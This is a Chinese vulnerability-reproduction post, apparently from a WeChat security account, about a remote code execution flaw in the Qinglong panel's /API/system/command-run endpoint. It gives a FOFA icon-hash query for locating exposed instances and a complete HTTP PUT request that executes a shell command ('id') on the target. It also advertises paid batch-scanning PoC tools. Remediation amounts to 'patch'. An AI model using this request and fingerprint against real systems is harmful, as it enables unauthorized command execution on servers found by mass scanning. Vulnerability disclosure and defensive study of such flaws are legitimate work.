#  青龙面板存在command-run接口存在远程代码执行漏洞 附POC  
2026-2-28更新
                    2026-2-28更新  南风漏洞复现文库   2026-02-28 15:52  
  
   
  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 青龙面板简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
本人只有 南风漏洞复现文库 和 南风网络安全  
 这两个公众号，其他公众号有意冒充，请注意甄别，避免上当受骗。  
  
青龙面板  
## 2.漏洞描述  
  
青龙面板存在command-run接口存在远程代码执行漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
青龙面板  
![青龙面板存在command-run接口存在远程代码执行漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6zfaZVib1P9juUFliae00B0wSMCic6gZh0eHGaJ6ZtN6iaaHPd4BW9fkT6taTCXiaDhmOXPf4fSrPrYpGicyKklCHRvRCgmo9HQfRTD0/640?wx_fmt=png&from=appmsg "null")  
  
青龙面板存在command-run接口存在远程代码执行漏洞  
## 4.fofa查询语句  
  
icon_hash=="-254502902"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/API/system/command-run  
  
漏洞数据包：  
```
PUT /API/system/command-run HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 17

{"command": "id"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6yibg7B9f2cicnJ0rUHKHJkq0nbNMvrdleab4pz2AkicWoA9cDS0NNzv3K6nDibJ0Y8jB7vM6wFnHxBZXHjzVZYuiaWCslZVKOpJh6w/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xBnJPmtIotShWrCicHb008QFE5Tjic7yQch4BmsNyDibTic15t3KOialO7FnthZk5XV59PjGbiaXbmAKFNz1RauYIjib9SkFJXR9pdhg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zxjncnkfe0UOtMtR5dBf3LjNYD6jI5xlFoica7pylf61fOQ6llodVXrhPgNSM4PdwAw0HktrzLerK81HnIRKa4U94QIETNXqdA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wjnsgVEvXTORHPEo4NrbPIUsfHheJ27LxZ6k81vl2WvPDD84tOAopFiawibJMbG57wkZGC36Bo9ASugiceYcRy0vYiaj4pUk5vT5Y/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6z8nzapumwZnqrBicsKgV7vactBGfxRAU3dJf2zSk38rcYhkJBeYYsAkumVH9GS1Aaqvvd8sc8vpH8GnJLCn2Libz48Ddrtc7MicI/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zd0yheTnopic6ia90rbX4PERzTZGQ7aBGlbZ43yakyvm79KFgxcNn41z4uvruKAocibW6cLdbkOU8zOibe4muk6CNoEKeRzUSw58I/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
